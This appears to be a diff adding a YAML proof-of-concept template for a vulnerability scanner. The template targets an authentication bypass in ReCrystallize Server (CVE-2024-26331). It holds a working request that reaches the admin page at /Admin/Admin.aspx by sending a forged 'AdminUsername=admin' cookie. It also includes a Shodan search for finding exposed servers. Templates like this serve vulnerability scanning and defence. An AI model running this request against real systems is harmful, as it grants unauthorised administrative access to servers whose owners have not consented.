@@ -1,0 +1,19 @@
+id: poc-yaml-recrystallize-server-authentication-bypass
+info:
+  name: ReCrystallize Server 身份认证绕过漏洞(CVE-2024-26331)
+  severity: high
+  tags:
+  - CVE-2024-26331
+  - 权限绕过
+  finger: recrystallize_server
+  shodan: title:"ReCrystallize"
+requests:
+- method: GET
+  path: /Admin/Admin.aspx
+  headers:
+    Cookie: AdminUsername=admin
+  expression: "status_code == 200 && \ncontains(body,\"ReCrystallize Server Administration\"\
+    ) &&\ncontains(body,\"License Status:\") &&\ncontains(body,\"System Info</a>\"\
+    )\n"
+variables: {}
+transport: http
